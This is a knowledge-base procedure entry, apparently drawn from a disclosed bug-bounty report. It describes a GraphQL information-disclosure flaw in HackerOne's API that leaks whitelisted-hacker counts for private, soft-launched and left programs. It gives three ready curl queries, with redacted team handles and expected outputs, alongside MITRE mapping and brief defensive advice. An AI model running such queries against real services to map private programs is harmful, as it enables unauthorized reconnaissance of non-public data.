---
id: proc-graphql-program-types-test
tags:
  - graphql
  - information-disclosure
  - private-programs
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
  - '[[Discovery]]'
commands:
  - '[[commands/graphql-query-nonpublic-program]]'
  - '[[commands/graphql-query-private-program]]'
  - '[[commands/graphql-query-left-program]]'
verified: false
platforms:
  - Web
  - GraphQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
updated_at: '2025-12-14T17:26:00.133Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
---
# Test-Whitelisted-Hackers-on-Program-Types

## Summary

This procedure tests the GraphQL vulnerability across different program types (public, soft-launched, private, and left programs) to confirm broad applicability of the information disclosure, revealing participant counts and privacy statuses.

## Description

By querying various team handles, attackers can disclose whitelisted hacker counts for non-public (e.g., 94 or 203), private/invitation-only (e.g., 1188), and even left programs (e.g., 551) without invitation. This aids in mapping internal program structures and identifying high-value targets. The technique relies on the same unauthorized access flaw in the Team object's whitelisted_hackers field.

## Requirements

1. List of target team handles for different program types.
2. HTTP client for repeated POST requests.
3. Basic understanding of GraphQL query syntax.

## Defense

Defensive measures and detection strategies:

- Enforce role-based access control (RBAC) on GraphQL queries by program type.
- Log and alert on queries to sensitive team handles from external IPs.
- Deprecate or restrict total_count fields for non-members.

## Objectives

1. Disclose participant counts in private programs.
2. Infer program privacy levels from count variations.
3. Demonstrate persistence of disclosure post-participation.

## Instructions

### Step 1: Query Non-Public Program

**Context**: Test on a soft-launched or not fully public program to retrieve whitelisted count.

**Command** ([[commands/graphql-query-nonpublic-program]]):
```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query {team(handle:\"█████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

> Expected output: JSON with total_count like 94 or 203, indicating partial disclosure.

### Step 2: Query Private Program

**Context**: Target an invitation-only private program to expose invited participant count without access.

**Command** ([[commands/graphql-query-private-program]]):
```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query {team(handle:\"████████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

> Expected output: JSON with total_count like 1188.

### Step 3: Query Left Program

**Context**: Verify disclosure persists for programs previously left without invitation.

**Command** ([[commands/graphql-query-left-program]]):
```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query {team(handle:\"████████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

> Expected output: JSON with total_count like 551.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance
- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[System Information Discovery]] System Information Discovery

### Sub-Techniques


## Commands Used

- [[commands/graphql-query-nonpublic-program]]
- [[commands/graphql-query-private-program]]
- [[commands/graphql-query-left-program]]

## Tools Used


## Tags

- graphql
- private-programs
- reconnaissance
